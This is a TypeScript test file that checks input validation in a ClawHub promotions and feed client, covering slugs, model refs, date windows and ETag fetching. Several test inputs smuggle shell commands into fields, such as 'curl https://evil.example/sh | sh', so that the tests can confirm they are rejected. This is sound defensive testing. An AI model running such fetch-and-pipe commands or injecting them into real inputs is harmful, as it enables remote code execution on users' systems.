import { describe, expect, it } from "vitest";
import { useMockHttp } from "../test-utils/mock-http.js";
import {
  fetchClawHubPromotion,
  fetchClawHubPromotions,
  fetchClawHubPromotionsFeed,
  parseClawHubPromotionsFeed,
} from "./clawhub.js";

const CLAWHUB_URL = "https://clawhub.ai";
const mockHttp = useMockHttp();

const validPromotion = {
  slug: "spring-models",
  title: "Free Example models",
  blurb: "A limited-time offer.",
  status: "active",
  active: true,
  startsAt: 100,
  endsAt: 200,
  provider: "openrouter",
  authChoiceId: "openrouter-api-key",
  models: [{ modelRef: "openrouter/example/model-alpha", alias: "Alpha", suggestedDefault: true }],
  signupUrl: "https://signup.example.com",
};

describe("promotion payload validation", () => {
  async function expectPromotionRejected(
    overrides: Record<string, unknown>,
    expected: RegExp,
  ): Promise<void> {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/promotions/spring-models`,
      reply: { json: { ...validPromotion, ...overrides } },
    });
    await expect(fetchClawHubPromotion({ slug: "spring-models" })).rejects.toThrow(expected);
  }

  it("rejects payloads without models", async () => {
    await expectPromotionRejected({ models: [] }, /models/);
  });

  it("rejects slugs outside ClawHub's slug contract", async () => {
    await expectPromotionRejected({ slug: "deal; curl evil.sh|sh" }, /slug/);
  });

  it("rejects model refs with shell metacharacters", async () => {
    await expectPromotionRejected(
      { models: [{ modelRef: "openrouter/foo; curl https://evil.example/sh | sh" }] },
      /unsupported characters/,
    );
  });

  it("rejects non-string model refs", async () => {
    await expectPromotionRejected({ models: [{ modelRef: 42 }] }, /modelRef/);
  });

  it("rejects non-numeric windows", async () => {
    await expectPromotionRejected({ endsAt: "soon" }, /endsAt/);
  });

  it("rejects inverted promotion windows", async () => {
    await expectPromotionRejected({ startsAt: 200, endsAt: 200 }, /window/);
  });

  it("rejects plugin values that are not package names", async () => {
    await expectPromotionRejected(
      { pluginNames: ["@openclaw/openrouter-provider@latest"] },
      /pluginNames/,
    );
  });
});

describe("promotion fetches", () => {
  it("fetches and validates the active promotions list", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/promotions`,
      reply: { json: { promotions: [validPromotion] } },
    });
    const promotions = await fetchClawHubPromotions();
    expect(promotions).toHaveLength(1);
  });

  it("rejects a list response without a promotions array", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/promotions`,
      reply: { json: { nope: true } },
    });
    await expect(fetchClawHubPromotions()).rejects.toThrow(/promotions array/);
  });

  it("fetches a single promotion by slug", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/promotions/spring-models`,
      reply: { json: validPromotion },
    });
    const promotion = await fetchClawHubPromotion({ slug: "spring-models" });
    expect(promotion.title).toBe("Free Example models");
  });
});

const { status: _status, active: _active, ...feedEntryFields } = validPromotion;
const validFeed = {
  schemaVersion: 1,
  id: "clawhub-promotions",
  generatedAt: "2026-07-05T00:00:00.000Z",
  sequence: 3,
  expiresAt: "2026-07-06T00:00:00.000Z",
  entries: [{ type: "promotion", ...feedEntryFields }],
};

describe("parseClawHubPromotionsFeed", () => {
  it("parses a valid feed snapshot", () => {
    const feed = parseClawHubPromotionsFeed(validFeed);
    expect(feed.sequence).toBe(3);
    expect(feed.entries[0]?.slug).toBe("spring-models");
    expect(feed.entries[0]?.models[0]?.modelRef).toBe("openrouter/example/model-alpha");
  });

  it("rejects wrong feed ids and schema versions", () => {
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, id: "other-feed" })).toThrow(/feed id/);
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, schemaVersion: 2 })).toThrow(
      /schema version/,
    );
  });

  it("rejects malformed sequences, timestamps, and entry types", () => {
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, sequence: -1 })).toThrow(/sequence/);
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, generatedAt: "not-a-date" })).toThrow(
      /ISO dates/,
    );
    expect(() =>
      parseClawHubPromotionsFeed({ ...validFeed, generatedAt: "1700000000000" }),
    ).toThrow(/ISO dates/);
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        entries: [{ type: "advert", ...feedEntryFields }],
      }),
    ).toThrow(/entry type/);
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        expiresAt: "2026-07-04T00:00:00.000Z",
      }),
    ).toThrow(/expiresAt/);
  });

  it.each([
    { field: "generatedAt", value: "2026-02-30T00:00:00.000Z" },
    { field: "expiresAt", value: "2026-11-31T00:00:00.000Z" },
  ])("rejects a calendar-invalid $field", ({ field, value }) => {
    expect(() => parseClawHubPromotionsFeed({ ...validFeed, [field]: value })).toThrow(/ISO dates/);
  });

  it("accepts canonical ISO calendar dates including leap day", () => {
    // Canonical leap day must still parse.
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        generatedAt: "2028-02-29T12:00:00.000Z",
        expiresAt: "2028-03-01T12:00:00.000Z",
      }),
    ).not.toThrow();
  });

  it("holds feed entries to the promotion payload contracts", () => {
    expect(() =>
      parseClawHubPromotionsFeed({
        ...validFeed,
        entries: [{ type: "promotion", ...feedEntryFields, models: [{ modelRef: "bad ref; rm" }] }],
      }),
    ).toThrow(/modelRef/);
  });
});

describe("fetchClawHubPromotionsFeed", () => {
  it("fetches without auth, returns the parsed feed and etag", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
      requestHeaders: (headers) =>
        !Object.keys(headers).some((name) => name.toLowerCase() === "authorization"),
      reply: { json: validFeed, headers: { etag: '"seq-3"' } },
    });
    const result = await fetchClawHubPromotionsFeed();
    expect(result.status).toBe("ok");
    if (result.status === "ok") {
      expect(result.feed.sequence).toBe(3);
      expect(result.etag).toBe('"seq-3"');
    }
  });

  it("sends If-None-Match and maps 304 to not-modified", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
      requestHeaders: { "if-none-match": '"seq-3"' },
      reply: { status: 304 },
    });
    const result = await fetchClawHubPromotionsFeed({ etag: '"seq-3"' });
    expect(result.status).toBe("not-modified");
  });

  it("does not extend the interactive feed timeout with transient retries", async () => {
    mockHttp.intercept({
      url: `${CLAWHUB_URL}/api/v1/feeds/promotions`,
      reply: new Error("offline"),
    });

    await expect(fetchClawHubPromotionsFeed()).rejects.toMatchObject({
      message: "fetch failed",
      cause: expect.objectContaining({ message: "offline" }),
    });

    expect(mockHttp.requests()).toHaveLength(1);
  });
});
